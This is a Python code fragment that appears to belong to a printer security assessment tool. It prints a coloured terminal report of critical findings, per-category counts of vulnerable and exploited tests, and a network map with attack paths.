        print(f"\n  {RED}CRITICAL/HIGH FINDINGS ({len(report.critical_findings)}){RESET}")
        print(f"  {'-'*65}")
        for r in report.critical_findings:
            print(f"  {RED}[!]{RESET} {r.category}/{r.attack} [{r.severity.upper()}]")
            print(f"      {r.evidence[:80]}")
            if r.note:
                print(f"      Note: {r.note[:80]}")

    # Category summary
    cats: Dict[str, List[AttackResult]] = {}
    for r in report.results:
        cats.setdefault(r.category, []).append(r)

    print("\n  RESULTS BY CATEGORY")
    print(f"  {'-'*65}")
    for cat, results in cats.items():
        vuln = sum(1 for r in results if r.vulnerable)
        expl = sum(1 for r in results if r.exploited)
        print(f"  {cat:<28} {len(results)} tests  "
              f"{YEL}{vuln} vuln{RESET}  {RED}{expl} exploited{RESET}")

    if report.network_map:
        nm = report.network_map
        print("\n  NETWORK MAP")
        print(f"  Gateway: {nm.gateway} | Hosts: {len(nm.hosts)} | "
              f"Other printers: {len(nm.other_printers)}")
        for path in nm.attack_paths[:5]:
            print(f"  {YEL}→{RESET} {path}")
    print()
